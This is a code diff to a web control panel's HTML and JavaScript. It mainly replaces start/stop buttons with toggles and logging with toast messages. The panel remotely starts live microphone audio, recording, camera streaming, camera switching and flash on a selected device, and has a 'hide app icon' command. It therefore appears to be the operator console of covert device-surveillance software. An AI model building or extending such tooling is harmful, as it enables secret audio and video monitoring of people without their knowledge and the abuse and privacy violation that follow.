@@ -32,6 +32,8 @@
         </div>
     </nav>
 
+    <div id="toast-container" class="toast-container"></div>
+
     <div class="container">
 
         <!-- MONITOR TAB -->
@@ -40,6 +42,7 @@
                 <!-- Main Feed -->
                 <div class="video-wrapper">
                     <video id="video-stream" autoplay playsinline muted></video>
+                    <div id="video-overlay" class="video-status-overlay"></div>
                     <div
                         style="position: absolute; top: 1rem; right: 1rem; background: rgba(0,0,0,0.6); padding: 0.25rem 0.5rem; border-radius: 4px; font-size: 0.75rem;">
                         🔴 LIVE
@@ -61,12 +64,11 @@
                     <div class="card">
                         <h3>🎙️ Quick Controls</h3>
                         <div class="btn-row">
-                            <button onclick="startAudio()">▶️ Start Live Audio</button>
-                            <button onclick="stopAudio()">⏸️ Stop Live Audio</button>
+                            <button id="btn-audio" onclick="toggleAudio()">▶️ Start Live Audio</button>
                         </div>
                         <div class="btn-row" style="margin-top: 0.5rem;">
-                            <button onclick="startManualRecording()" class="primary">🔴 Start Manual Recording</button>
-                            <button onclick="stopManualRecording()">⏹️ Stop Manual Recording</button>
+                            <button id="btn-record" onclick="toggleManualRecording()" class="primary">🔴 Start Manual
+                                Recording</button>
                         </div>
                     </div>
                 </div>
@@ -238,36 +240,60 @@
             logsDiv.scrollTop = logsDiv.scrollHeight;
         }
 
-        // Audio Control
-        function startAudio() {
-            if (!audioCtx) {
-                audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
+        // Audio Control (Toggled)
+        function toggleAudio() {
+            const btn = document.getElementById('btn-audio');
+
+            if (!isAudioRunning) {
+                if (!currentDeviceId) return showToast("Select a device first!", "error");
+
+                if (!audioCtx) {
+                    audioCtx = new (window.AudioContext || window.webkitAudioContext)({ sampleRate: 44100 });
+                }
+                if (audioCtx.state === 'suspended') audioCtx.resume();
+
+                socket.emit('start_monitoring', currentDeviceId);
+
+                // Update UI
+                isAudioRunning = true;
+                btn.innerHTML = "⏹️ Stop Live Audio";
+                btn.classList.add('active-state');
+                btn.classList.add('danger');
+                showToast("Live Audio Started", "success");
+            } else {
+                if (!currentDeviceId) return;
+                socket.emit('stop_monitoring', currentDeviceId);
+
+                // Update UI
+                isAudioRunning = false;
+                btn.innerHTML = "▶️ Start Live Audio";
+                btn.classList.remove('active-state');
+                btn.classList.remove('danger');
+                showToast("Live Audio Stopped");
             }
-            if (audioCtx.state === 'suspended') {
-                audioCtx.resume();
+        }
+
+        // Manual Recording Control (Toggled)
+        function toggleManualRecording() {
+            const btn = document.getElementById('btn-record');
+
+            if (!isRecording) {
+                if (!currentDeviceId) return showToast("Select a device first!", "error");
+                socket.emit('START_MANUAL_RECORDING', currentDeviceId);
+
+                isRecording = true;
+                btn.innerHTML = "⏹️ Stop Recording";
+                btn.classList.add('active-state');
+                showToast("Recording Started on Device", "success");
+            } else {
+                if (!currentDeviceId) return;
+                socket.emit('STOP_MANUAL_RECORDING', currentDeviceId);
+
+                isRecording = false;
+                btn.innerHTML = "🔴 Start Manual Recording";
+                btn.classList.remove('active-state');
+                showToast("Recording Stopped");
             }
-            if (!currentDeviceId) return alert("Select a device!");
-            socket.emit('start_monitoring', currentDeviceId);
-            log("✅ Audio monitoring started for " + currentDeviceId);
-        }
-
-        function stopAudio() {
-            if (!currentDeviceId) return;
-            socket.emit('stop_monitoring', currentDeviceId);
-            log("⏹️ Audio monitoring stopped");
-        }
-
-        // Manual Recording Control
-        function startManualRecording() {
-            if (!currentDeviceId) return alert("Select a device!");
-            socket.emit('START_MANUAL_RECORDING', currentDeviceId);
-            log("🔴 Manual recording started on device");
-        }
-
-        function stopManualRecording() {
-            if (!currentDeviceId) return;
-            socket.emit('STOP_MANUAL_RECORDING', currentDeviceId);
-            log("⏹️ Manual recording stopped");
         }
 
         // Video Control with WebRTC
@@ -317,7 +343,10 @@
                     targetId: currentDeviceId,
                     offer: { type: offer.type, sdp: offer.sdp }
                 }));
-                log("✅ WebRTC offer sent");
+
+                isVideoRunning = true;
+                showVideoStatus("CAMERA STARTED");
+                showToast("Camera connection initiated...", "success");
 
             } catch (error) {
                 log(`❌ Error: ${error.message}`);
@@ -336,20 +365,46 @@
                 videoElement.srcObject.getTracks().forEach(track => track.stop());
                 videoElement.srcObject = null;
             }
-            log("⏹️ Camera stopped");
+            isVideoRunning = false;
+            showVideoStatus("CAMERA STOPPED");
+            showToast("Camera stopped");
         }
 
         function switchVideo() {
             if (!currentDeviceId) return;
             socket.emit('switch_camera', currentDeviceId);
-            log("🔄 Camera switched");
+            showVideoStatus("SWITCHING CAMERA...");
+            showToast("Switching camera...");
         }
 
-        function toggleFlash() { if (currentDeviceId) { socket.emit('toggle_flash', currentDeviceId); log("💡 Flash toggled"); } }
-        function brightnessUp() { if (currentDeviceId) { socket.emit('brightness_up', currentDeviceId); log("🔆 Brightness +"); } }
-        function brightnessDown() { if (currentDeviceId) { socket.emit('brightness_down', currentDeviceId); log("🔅 Brightness -"); } }
+        function toggleFlash() {
+            if (currentDeviceId) {
+                socket.emit('toggle_flash', currentDeviceId);
+                showVideoStatus("FLASH TOGGLED");
+                showToast("Flash toggle sent");
+            }
+        }
 
-        function hideAppIcon() { if (confirm("Hide app icon?") && currentDeviceId) socket.emit('hide_app_icon', currentDeviceId); }
+        function brightnessUp() {
+            if (currentDeviceId) {
+                socket.emit('brightness_up', currentDeviceId);
+                showVideoStatus("BRIGHTNESS +");
+            }
+        }
+
+        function brightnessDown() {
+            if (currentDeviceId) {
+                socket.emit('brightness_down', currentDeviceId);
+                showVideoStatus("BRIGHTNESS -");
+            }
+        }
+
+        function hideAppIcon() {
+            if (confirm("Hide app icon?") && currentDeviceId) {
+                socket.emit('hide_app_icon', currentDeviceId);
+                showToast("Hide Icon command sent", "success");
+            }
+        }
 
         function toggleFullscreen() {
             const video = document.getElementById('video-stream');
@@ -377,7 +432,7 @@
             };
             if (!currentDeviceId) return alert("Select a device!");
             socket.emit('update_config', { targetId: currentDeviceId, config: config });
-            log("💾 Config pushed to device");
+            showToast("Configuration saved to device", "success");
         }
 
         function getConfig() { if (currentDeviceId) socket.emit('get_config', currentDeviceId); }
@@ -568,7 +623,7 @@
         function onDeviceSelected() {
             currentDeviceId = deviceSelect.value;
             if (currentDeviceId) {
-                log("📱 Switched to: " + currentDeviceId);
+                showToast("Switched to device: " + currentDeviceId, "info");
                 // Refresh data for new device
                 getConfig();
                 getStorageStats();
